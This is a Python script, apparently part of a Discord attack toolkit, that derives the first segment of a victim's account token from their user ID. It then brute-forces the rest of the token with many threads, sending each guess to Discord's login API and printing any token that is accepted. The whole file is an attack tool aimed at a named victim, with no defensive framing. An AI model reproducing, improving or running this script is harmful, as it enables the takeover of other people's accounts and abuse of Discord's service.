from Config.Util import *
from Config.Config import *
import base64
import threading
import random
import string
import requests

Title("Discord Token To Id")

userid = input(f"{color.RED}\n{INPUT} Victime ID -> {color.RESET}")
encodedBytes = base64.b64encode(userid.encode("utf-8"))
OnePartToken = str(encodedBytes, "utf-8")
motifs = ["=", "==", "==="]
for motif in motifs:
    if OnePartToken.endswith(motif):
        OnePartToken = OnePartToken[:-2]

print(f'{color.RED}{INFO} Part One Token: \"{color.WHITE}{OnePartToken}.{color.RED}\"{color.RESET}')

brute = input(f"{color.RED}[?] | Find the second part by brute force ? (y/n) -> {color.RESET}")
if brute in ['y', 'Y', 'Yes', 'yes']:
    try:
     thrd =  input(f"{color.RED}{INPUT} Threads -> {color.RESET}")
    except:
     ErrorNumber()

    def bruhmoment():
        while OnePartToken == OnePartToken:
            try:
             token = OnePartToken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
            except:
             ErrorId()
            header={
                'Authorization': token
            }
            bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

            if bruh.status_code == 200:
                    print(f"{color.GREEN}{ADD} Token Found | {color.WHITE}{token}{color.RESET}")
                    Continue()

            else:
                    print(f"{color.RED}{ERROR} Token Invalid | {color.WHITE}{token}{color.RESET}")

    threads = []
    try:
     for _ in range(int(thrd)):
        t = threading.Thread(target=bruhmoment)
        t.start()
        threads.append(t)
    except:
     ErrorNumber()

    for thread in threads:
        thread.join()
else:
    Continue()
    Reset()